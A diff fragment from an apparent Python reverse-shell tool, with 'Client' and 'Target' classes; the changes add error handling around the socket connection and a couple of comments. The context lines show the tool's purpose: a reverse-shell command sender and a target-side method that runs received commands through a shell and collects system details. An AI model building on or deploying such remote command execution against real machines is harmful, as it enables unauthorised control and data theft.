@@ -28,9 +28,14 @@ class Client(Machine):
         self.connection_active = False  # use to exit the menu loop
 
     def connect_to_server(self):
-        self.s.connect((self.host, self.port))
-        self.connection_active = True
-        print("Connexion has been establish | IP " + self.host + " | Port : " + str(self.port))
+        try:
+            self.s.connect((self.host, self.port))
+            self.connection_active = True
+            print("Connexion has been establish | IP " + self.host + " | Port : " + str(self.port))
+        except socket.gaierror as msg:
+            print("the ip address is invalid")
+            print("Error " + str(msg))
+
 
     def reverse_shell_send_command(self):
         try:
@@ -191,6 +196,7 @@ class Target(Machine):
                   + platform.uname()[2] + "\nVersion: " + platform.uname()[3] + "\nMachine: " + platform.uname()[4]
                   + "\nProcessor: " + platform.uname()[5])
 
+    # usr reverse shell to send back information (ip & user list)
     def getinfo_target_cmd(self, command):
         cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                stdin=subprocess.PIPE)
@@ -202,6 +208,7 @@ class Target(Machine):
             print(command)
             print(output_str)
 
+    # define the buffer size
     def change_buffer_size(self):
         self.buffer = int(self.conn.recv(self.buffer))
         if self.print:
